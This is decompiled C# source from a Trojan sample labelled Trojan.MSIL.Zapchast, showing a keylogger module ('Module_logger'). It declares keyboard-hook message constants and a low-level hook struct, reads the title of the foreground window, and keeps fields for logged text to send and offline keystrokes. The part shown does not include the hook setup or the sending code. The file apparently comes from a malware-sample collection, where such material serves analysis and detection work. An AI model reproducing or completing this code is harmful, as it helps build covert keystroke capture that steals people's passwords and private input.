// Decompiled with JetBrains decompiler
// Type: zub.Module_logger
// Assembly: zub, Version=1.0.1.5, Culture=neutral, PublicKeyToken=null
// MVID: 48A5438B-11FD-4EEE-88C7-AA931AE92F31
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Zapchast.aaxrn-15afce431f9064b1d75b7e7f83f2d7ad5b9e68621f44a39c75ffd88172493695.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace zub
{
  [StandardModule]
  internal sealed class Module_logger
  {
    private static string Sendetext = (string) null;
    private static int i = 0;
    private const int WM_KEYUP = 257;
    private const short WM_KEYDOWN = 256;
    private const int WM_SYSKEYDOWN = 260;
    private const int WM_SYSKEYUP = 261;
    private static IntPtr KeyboardHandle = (IntPtr) 0;
    private static string LastCheckedForegroundTitle = "";
    private static string OfflineKey = (string) null;

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    public static object Hooked() => (object) (Module_logger.KeyboardHandle != (IntPtr) 0);

    public static string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Module_logger.GetWindowText(Module_logger.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public struct KBDLLHOOKSTRUCT
    {
      public int vkCode;
      public int scanCode;
      public int flags;
      public int time;
      public int dwExtraInfo;
    }
  }
}
